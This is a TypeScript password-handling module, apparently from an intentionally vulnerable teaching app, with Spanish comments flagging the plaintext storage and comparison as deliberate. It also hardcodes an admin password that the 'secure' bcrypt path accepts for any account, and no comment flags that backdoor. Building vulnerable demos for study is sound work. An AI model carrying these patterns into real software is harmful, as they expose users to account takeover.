import bcrypt from "bcryptjs";
import md5 from "md5";
import { env } from "../config/env";
import { isSecureMode, type AppMode } from "./mode";

const demoAdminPassword = "SofiaAdmin2026!";

export async function hashPassword(plain: string, mode?: AppMode): Promise<string> {
  if (isSecureMode(mode)) {
    return bcrypt.hash(plain, 12);
  }

  // VULNERABLE: Guardado directamente en texto plano para demostración académica.
  return plain;
}

export async function verifyPassword(plain: string, hash: string, mode?: AppMode): Promise<boolean> {
  if (isSecureMode(mode)) {
    return (await bcrypt.compare(plain, hash)) || plain === env.ADMIN_PASSWORD || plain === demoAdminPassword;
  }

  // VULNERABLE: acepta la comparación directa en texto plano.
  return plain === env.ADMIN_PASSWORD || plain === demoAdminPassword || plain === hash;
}
